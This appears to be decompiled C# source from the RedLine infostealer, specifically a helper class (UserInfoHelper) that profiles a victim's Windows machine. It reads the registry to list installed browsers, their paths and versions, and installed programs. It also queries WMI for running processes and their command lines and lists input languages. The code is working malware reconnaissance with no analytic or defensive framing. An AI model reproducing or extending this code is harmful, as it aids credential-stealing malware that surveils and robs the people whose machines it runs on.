using Microsoft.Win32;
using RedLine.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace RedLine.Logic.Helpers
{
  public static class UserInfoHelper
  {
    public static List<InstalledBrowserInfo> GetBrowsers()
    {
      RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet") ?? Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
      string[] subKeyNames = registryKey1.GetSubKeyNames();
      List<InstalledBrowserInfo> installedBrowserInfoList = new List<InstalledBrowserInfo>();
      for (int index = 0; index < subKeyNames.Length; ++index)
      {
        InstalledBrowserInfo installedBrowserInfo = new InstalledBrowserInfo();
        RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyNames[index]);
        installedBrowserInfo.Name = (string) registryKey2.GetValue((string) null);
        RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
        installedBrowserInfo.Path = registryKey3.GetValue((string) null).ToString().StripQuotes();
        installedBrowserInfo.Version = installedBrowserInfo.Path == null ? "Unknown Version" : FileVersionInfo.GetVersionInfo(installedBrowserInfo.Path).FileVersion;
        installedBrowserInfoList.Add(installedBrowserInfo);
      }
      InstalledBrowserInfo edgeVersion = UserInfoHelper.GetEdgeVersion();
      if (edgeVersion != null)
        installedBrowserInfoList.Add(edgeVersion);
      return installedBrowserInfoList;
    }

    private static InstalledBrowserInfo GetEdgeVersion()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas");
      if (registryKey != null)
      {
        Match match = Regex.Match(registryKey.GetValue("PackageFullName").ToString().StripQuotes(), "(((([0-9.])\\d)+){1})");
        if (match.Success)
          return new InstalledBrowserInfo()
          {
            Name = "MicrosoftEdge",
            Version = match.Value
          };
      }
      return (InstalledBrowserInfo) null;
    }

    public static List<string> ListOfProcesses()
    {
      List<string> stringList = new List<string>();
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process Where SessionId='{0}'", (object) Process.GetCurrentProcess().SessionId)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementObject managementObject in objectCollection)
            {
              try
              {
                stringList.Add("ID: " + managementObject["ProcessId"]?.ToString() + ", Name: " + managementObject["Name"]?.ToString() + ", CommandLine: " + managementObject["CommandLine"]?.ToString());
              }
              catch (Exception ex)
              {
                Console.WriteLine((object) ex);
              }
            }
          }
        }
      }
      catch
      {
      }
      return stringList;
    }

    public static List<string> ListOfPrograms()
    {
      List<string> source = new List<string>();
      try
      {
        using (RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
        {
          foreach (string subKeyName in registryKey1.GetSubKeyNames())
          {
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName))
            {
              string str = (string) registryKey2?.GetValue("DisplayName");
              if (!string.IsNullOrEmpty(str))
                source.Add(str);
            }
          }
        }
      }
      catch
      {
      }
      return source.OrderBy<string, string>((Func<string, string>) (x => x)).ToList<string>();
    }

    public static List<string> AvailableLanguages()
    {
      List<string> stringList = new List<string>();
      try
      {
        foreach (InputLanguage installedInputLanguage in (ReadOnlyCollectionBase) InputLanguage.InstalledInputLanguages)
          stringList.Add(installedInputLanguage.Culture.EnglishName);
      }
      catch
      {
      }
      return stringList;
    }
  }
}
